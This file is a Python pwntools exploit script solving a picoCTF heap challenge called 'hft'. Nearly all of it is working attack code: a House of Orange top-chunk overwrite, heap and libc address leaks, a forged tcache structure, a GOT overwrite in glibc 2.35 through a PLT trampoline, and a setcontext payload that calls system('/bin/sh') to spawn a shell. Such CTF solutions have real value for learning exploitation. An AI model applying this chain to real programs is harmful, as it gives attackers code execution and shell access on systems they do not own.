from pwn import *

host = 'tethys.picoctf.net'
port = 50343

r = process('./hft')#remote(host, port)
libc = ELF('/home/sayhi/Desktop/ctf/pico/2.35-0ubuntu3_amd64/libc.so.6')

MMAP_THERSOLD_G = 150 * 0x1000

def send_echo(content, length):
	r.recvuntil(b'PKT_RES')
	r.send(p64(length))
	
	if content != b'':
		payload = content
		r.sendline(p64(1) + payload)
	else:
		r.sendline(p8(1) + b'\0\0\0\0\0\0')

def send_raw(content, length):
	r.send(p64(length))
	payload = content
	r.sendline(payload)

def get_leak():
	r.recvuntil(b':[')
	data = u64(r.recv(6) + b'\0\0')

	return data

def tcache(indexes, args, length):
	tps = p64(0) + p64(0x291)
	addition = p16(0)

	for i in range(64):
		for j in range(length):
			if i == indexes[j]: addition = p16(1)
		
		tps += addition
		addition = p16(0)

	addition = p64(0)

	for i in range(64):
		for j in range(length):
			if i == indexes[j]: addition = p64(args[j])
		
		tps += addition
		addition = p64(0)

	return tps

# House of Orange

new_top_chunk_size = 0xd51
payload = b'a' * 8 + p64(new_top_chunk_size)

send_echo(payload, 0x10)
send_echo(b'', 0x1000)
pause()
send_echo(b'', 0x10)

pause()
leaked_heap = get_leak()
print(f'[+] Leaked heap : {hex(leaked_heap)}')

pause()
heap_base = leaked_heap & ~0xfff
print(f'[+] Heap base : {hex(heap_base)}')

# Fake tcache_perthread_struct

chunk = heap_base | 0x5e0
next_tps = heap_base | 0x300

indexes = [0, 1]
args = [chunk, next_tps - 0x20]

tps = tcache(indexes, args, 2)
send_echo(tps, 0x300)

# mmap2LTS

payload = b'a' * (0x976f8 - 0x20) + p64(next_tps)

send_echo(payload, MMAP_THERSOLD_G)

# Main arena leak

send_echo(b'', 0x10)

libc_main_arena_leak = get_leak()
print(f'[+] Libc main arena leak : {hex(libc_main_arena_leak)}')

offset2libc = 0x21a250
libc.address = libc_main_arena_leak - offset2libc
print(f'[+] Libc base : {hex(libc.address)}')

# GOT-owerwrite by PLT-trampoline

got = libc.address + libc.dynamic_value_by_tag('DT_PLTGOT')
plt = libc.address + libc.get_section_by_name('.plt').header.sh_addr

print(f'[+] GOT : {hex(got)}')
print(f'[+] PLT : {hex(plt)}')

# 1. Make new tps

indexes = [0]
args = [got]
length = 1

tps = tcache(indexes, args, length)

send_echo(tps, 0x20)

# 2. Assmebly final payload

system = libc.address + 0x50d60
bin_sh = libc.address + 0x1d8698

print(f'[+] system : {hex(system)}')
print(f'[+] /bin/sh : {hex(bin_sh)}')

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (bytes):
    return flat(
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )

payload = setcontext32(libc, rip=system, rdi=bin_sh)
pause()
send_raw(payload, 0)

r.interactive()
